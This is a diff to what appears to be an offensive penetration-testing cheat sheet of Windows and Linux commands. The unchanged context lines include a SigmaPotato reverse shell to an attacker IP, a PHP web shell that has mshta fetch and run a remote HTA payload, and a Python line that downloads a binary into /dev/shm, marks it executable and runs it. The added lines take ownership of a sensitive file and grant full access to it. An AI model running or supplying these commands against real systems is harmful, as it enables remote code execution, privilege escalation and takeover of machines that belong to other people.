@@ -906,10 +906,15 @@ C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
 echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate http://$MYIP:8080/11jUSgyiO5We7; chmod 777 /dev/shm/iZGYpy3w; /dev/shm/iZGYpy3w& disown")' > test.py
 
++---------- File Permissions ----------+
+powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
+takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
+
 +---------- System Enumeration ----------+
 dir C:\inetpub\wwwroot
 dir C:\xampp
-icacls C:\Windows\System32\Config
+
+
 
 
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
